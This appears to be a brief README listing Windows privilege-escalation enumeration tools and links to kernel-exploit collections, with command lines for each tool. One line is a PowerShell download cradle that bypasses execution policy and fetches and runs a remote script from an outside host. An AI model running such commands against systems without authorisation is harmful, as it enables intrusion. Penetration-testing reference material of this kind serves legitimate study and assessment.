# windows-prives-esc

## Running exploit suggesters to get exploits info</br>
**Getting systeminfo**</br>
```systeminfo > systeminfo.txt```</br>

**Download all kernel exploits from secwiki kernel exploits & other exploits listing:**
https://github.com/SecWiki/windows-kernel-exploits</br>
https://github.com/abatchy17/WindowsExploits</br>

**Tools for Exploits listing**</br>
**1. Download Wes.py:** https://github.com/bitsadmin/wesng</br>
```wes.py systeminfo.txt```</br>

**2. Download Windows exploit suggester script:** https://github.com/AonCyberLabs/Windows-Exploit-Suggester</br>
```windows-exploit-suggester.py --update```</br>
```windows-exploit-suggester.py systeminfo.txt```</br>

**3. Download and run powerup script:** </br>
```powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks```

**4. Download Jaws script:** https://github.com/411Hall/JAWS</br>
```powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt```</br>

**5. Download & run seatbelt:** https://github.com/GhostPack/Seatbelt
`````
Seatbelt.exe -group=all -full
Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
`````

**6. Download & run winpeas:** https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe </br>
To enable results in colour run the command: 
```REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 ```</br>
```winpeas.exe```
